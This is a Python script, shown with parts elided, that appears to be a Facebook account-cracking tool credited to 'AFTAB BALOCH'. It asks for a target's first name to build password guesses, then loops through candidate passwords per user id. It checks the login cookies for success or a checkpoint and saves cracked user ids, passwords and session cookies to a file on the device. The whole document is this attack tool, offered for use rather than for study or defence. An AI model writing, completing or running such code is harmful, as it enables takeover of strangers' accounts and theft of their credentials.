#Create By: AFTAB BALOCH
#FaceBook: AFTAB BALOCH
#GitHub: https://github.com/Toxic-Aftab
#---------------------------------------------------------------------------#
...
\x1b[1;97m| () () || (   ) || (    \/| (   ) || (   ) || () () |
\x1b[1;92m| || || || (___) || (_____ | |   | || |   | || || || |
\x1b[1;97m| |(_)| ||  ___  |(_____  )| |   | || |   | || |(_)| |
\x1b[1;92m| |   | || (   ) |      ) || |   | || |   | || |   | |
\x1b[1;97m| )   ( || )   ( |/\____) || (___) || (___) || )   ( |
\x1b[1;92m|/     \||/     \|\_______)(_______)(_______)|/     \|                                                      
\033[91;1m--------------------------------------------------
\033[97;1mOWNERS      : AFTAB x MASOOM
\033[97;1mFACEBOOK    : AFTAB BALOCH x DEAR MASOOM
\033[97;1mVERSION     : 1.0.0
\033[97;1mGITHUB      : Toxic-Aftab
\033[97;1mTOOL TYPE   : \x1b[91;1mFree
\x1b[1;97m--------------------------------------------------"""
def lines():
        print('\033[1;97m==================================================')
class Main:
...
def gml():
    ...
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : aftab, azaan, billal, ayaan')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] Target first name : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : ali, hassan, baloch, khan, rajput, etc......')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mMASOOM\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[MASOOM-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/masoom-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[MASOOM-CP] {cid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[MASOOM] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()